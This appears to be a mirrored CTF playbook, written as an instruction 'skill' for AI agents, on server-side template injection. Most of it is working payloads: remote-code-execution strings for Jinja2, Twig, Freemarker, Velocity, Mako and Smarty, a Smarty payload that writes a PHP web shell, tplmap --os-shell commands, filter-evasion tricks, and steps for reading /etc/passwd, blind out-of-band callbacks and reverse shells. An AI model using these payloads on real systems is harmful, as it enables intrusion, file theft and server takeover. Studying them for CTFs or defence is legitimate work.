# Server-Side Template Injection (SSTI)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/ssti.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/ssti.md)

---

---
name: ssti
category: web
triggers: [ssti, "template injection", "server-side template", jinja2, twig, freemarker, velocity, mako, smarty, handlebars, "{{7*7}}", "49", "${7*7}", "TemplateSyntaxError", "name=", "greeting", "email template"]
tools: [tplmap, curl, burp]
priority: high
description: Identify the template engine via probes, then chain to RCE — Jinja2/Twig/Freemarker/Velocity/Mako/Smarty polyglots.
---
# Server-Side Template Injection (SSTI)

## Trigger context
- User input is rendered back inside server-side output: usernames on a profile page, "Hello {name}", email/notification templates, error pages, PDF/report generators, subject lines, CMS theme fields.
- Signals: input like `{{7*7}}` returns `49`; `${7*7}` returns `49`; malformed braces throw `jinja2.exceptions.TemplateSyntaxError`, `Twig_Error`, `freemarker.core.ParseException`.
- Framework hints from [web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md): Flask/Django (Jinja2), PHP/Symfony (Twig), Java/Spring (Freemarker/Velocity/Thymeleaf), Node (Handlebars/Pug/EJS).

## Objective
Confirm SSTI, fingerprint the exact engine, then escalate to file read / RCE and grab the flag.

## Methodology (decision tree)
1. Confirm injection: submit `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`. A rendered `49` (not literal text) = SSTI.
2. Distinguish reflected-XSS vs SSTI: `{{7*'7'}}` -> `7777777` means Jinja2 (Python string mult); `49` means Twig/others.
3. Fingerprint the engine with the decision probes below (narrow Python vs PHP vs Java vs Ruby).
4. Pull engine-specific globals/objects to reach `os`/`Runtime`/`system`.
5. Execute command; if blind, use time delay or OOB (see [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md)).
6. Read the flag / spawn a shell.

## Commands & payloads
```
# 1-2. Detection & first split (submit each, watch output)
{{7*7}}        -> 49    (Jinja2, Twig, Nunjucks, ...)
${7*7}         -> 49    (Freemarker, Velocity, Mako, Smarty-ish)
<%= 7*7 %>     -> 49    (ERB / EJS)
#{7*7}         -> 49    (Ruby Slim / Pug interp)
{{7*'7'}}      -> 7777777 => Jinja2 ;  49 => Twig
${7*7}         renders while {{7*7}} does not => Freemarker/Velocity/Mako (Java/Python-${})
# universal error/fingerprint polyglot:
${{<%[%'"}}%\
```
```python
# 4-6. Jinja2 (Python / Flask) — modern RCE via config/cycler, no need to count subclasses
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('cat /flag').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
# classic subclass gadget (when the above are filtered) — index varies, grep for Popen:
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
```
# Twig (PHP / Symfony)
{{ 7*7 }}
{{ ['id'] | filter('system') }}
{{ ['id'] | map('system') | join }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("cat /flag") }}   # Twig <2.x
{{ ['cat${IFS}/flag'] | filter('system') }}

# Freemarker (Java)
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${ "freemarker.template.utility.Execute"?new()("cat /flag") }

# Velocity (Java)
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

# Mako (Python)
${ self.module.cache.util.os.system("id") }
<%import os%>${ os.popen("id").read() }

# Smarty (PHP)
{system('id')}
{php}system('id');{/php}                 # Smarty <3.1 with {php} enabled
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```
```bash
# Automated confirmation/exploitation
tplmap -u "http://TARGET/page?name=INJECT"          # detect + fingerprint
tplmap -u "http://TARGET/page?name=INJECT" --os-shell
# blind: confirm with time delay
{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}
```

## Branching logic
- `{{7*7}}`->49 but `${7*7}` literal => Jinja2/Twig family. `{{7*'7'}}`->`7777777` = Jinja2, else Twig.
- `${7*7}`->49 but `{{ }}` literal => Freemarker/Velocity/Mako (identify by Java vs Python error text).
- If output not reflected but input processed -> blind SSTI: use `sleep`/OOB from [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md).
- If sandbox blocks `os`/`popen` (Jinja2 sandboxed) -> hunt alternate gadgets (`request`, `lipsum`, `joiner`, `namespace`) or file read only.
- If only `49` and no gadget works -> may just be math eval / reflected [xss](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xss.md); re-check.
- Once RCE -> reverse shell + stabilize (see [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md)).

## Common pitfalls
- Confusing SSTI with reflected XSS: `{{7*7}}` printed literally = not SSTI (maybe XSS instead).
- Wrong brace syntax for the engine -> literal output; always test all four delimiter styles.
- Jinja2 subclass INDEX is environment-specific; prefer `config`/`lipsum`/`cycler` globals which don't need indices.
- URL-encode `+`, spaces, `&`, `{`,`}`; inside JSON escape quotes. Payload breakage often looks like "not vulnerable".
- WAF/keyword filters on `__class__`, `os`, `system` -> use attribute access `['__cla'+'ss__']`, `|attr()`, hex, or `request.args` indirection.
- Smarty/Twig `{php}`/callback tricks are version-gated; check version first.

## Proof / verification
- Deterministic: math probe renders (`49`/`7777777`), or `sleep 5` delays the response.
- RCE proof: `id`/`hostname` in output, then `cat /flag`, `find / -name 'flag*' 2>/dev/null`, or read `/etc/passwd`.
- Blind: OOB DNS/HTTP callback carrying `whoami`.

## Cross-references
[web-recon](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--web-recon.md) · [command-injection](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--command-injection.md) · [xss](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xss.md) · [cms-and-known-exploits](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--cms-and-known-exploits.md)

## Credible sources
- https://portswigger.net/web-security/server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
- https://github.com/epinna/tplmap
